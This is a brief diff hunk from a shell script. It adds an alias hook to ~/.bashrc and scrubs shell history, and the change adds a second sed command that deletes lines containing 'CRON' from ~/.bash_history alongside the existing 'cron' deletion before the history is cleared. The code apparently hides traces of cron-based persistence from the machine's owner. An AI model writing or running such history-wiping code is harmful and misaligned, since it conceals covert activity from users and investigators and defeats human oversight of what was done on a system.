@@ -29,5 +29,6 @@ if ! grep -q 'if \[ -f ~/.bash_aliases \]; then' "$B"; then
     echo -e "\n$AB" >> "$B"
 fi
 sed -i '/cron/d' ~/.bash_history
+sed -i '/CRON/d' ~/.bash_history
 history -c
 history -r
